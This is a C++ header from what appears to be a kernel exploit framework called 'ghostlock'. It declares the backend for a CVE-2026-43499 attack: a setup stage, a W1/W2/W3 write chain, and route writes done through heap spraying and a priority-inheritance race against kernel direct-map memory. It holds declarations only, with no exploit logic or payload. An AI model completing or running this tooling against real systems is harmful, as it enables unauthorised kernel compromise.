/**
 * @file backend.h
 * @brief 43499 核心的按用途头（由 core.cpp 拆分，声明/内联逐字保留）。
 */
#ifndef GHOSTLOCK_CORE_BACKEND_H
#define GHOSTLOCK_CORE_BACKEND_H

#include "session.h"
#include "profile.h"
#include "memory.h"
#include "support.h"
#include "route.h"
#include "log.h"

/* ==== session/backend/cve_2026_43499_backend.hpp ==== */
#ifndef GHOSTLOCK_CVE2026_43499_BACKEND_HPP
#define GHOSTLOCK_CVE2026_43499_BACKEND_HPP


namespace ghostlock::core {
    /** @brief 一次路由写的全部输入（结构体入参，无全局/类读取）。 */
    struct WriteInputs final {
        ghostlock::memory::WriteRequest request;
        std::uintptr_t direct_map_base;
        std::uintptr_t direct_map_end;
        const ghostlock::core::PageSprayInputs *spray;
        ghostlock::core::RaceRunParams *race;
        const char *desc;
        std::uint64_t timer_start_ns;
    };
} // namespace ghostlock::core

namespace ghostlock::session::backend {
    /* Batch 4 (D1=B) cve_2026_43499 backend: the setup stage plus the W1/W2/W3
     * step sequence. The sequence is owned by this backend, and the middleware
     * policy is a template parameter: every route hook (W2 repairs) and
     * capability (multicast / w3_exact_target) comes from
     * `Middleware`, so each catalogued middleware instantiates its own backend
     * code and produces a different pipeline by construction. Statement order
     * and log text are the pre-Batch-4 sequence, unchanged.
     *
     * The template definitions live in the unit with explicit instantiations
     * for the catalogued middleware policies; callers only include this header. */
    struct Cve2026_43499Policy final {
        static constexpr runtime::BackendKind kind = runtime::BackendKind::Cve2026_43499;

        /* setup -> W1 -> W2/W3 chain. Continue hands the filled chain to the
         * frontend handoff step (see runtime::Pipeline::run). */
        template <class Middleware>
        [[nodiscard]] static StageResult run(ExploitSession &session,
                                             const profile::kernel_offsets &decoded,
                                             const char *debug_dir, bool force_attack,
                                             VictimChain &chain);

        /* One route write: middleware resident fast path, else heap spray + PI
         * race. Public because the attack-function disassembly gate compares it
         * by symbol (cmp_disasm "do_one_write"). */
        template <class Middleware>
        [[nodiscard]] static std::int32_t attack_write(ghostlock::core::WriteInputs &in);

        /* Stage: process setup and profile installation (middleware-free). */
        [[nodiscard]] static StageResult run_setup(ExploitSession &session,
                                                   const profile::kernel_offsets &decoded,
                                                   const char *debug_dir, bool force_attack);
    };

    /* Availability is owned by component_catalog::backend_available(); the
     * execution policy carries only the id. The declared identity and this
     * policy must name the same backend. */
    static_assert(Cve2026_43499Policy::kind == runtime::backend::Cve2026_43499::kind);
    static_assert(runtime::backend_available(Cve2026_43499Policy::kind));
} // namespace ghostlock::session::backend

#endif

#endif // GHOSTLOCK_CORE_BACKEND_H
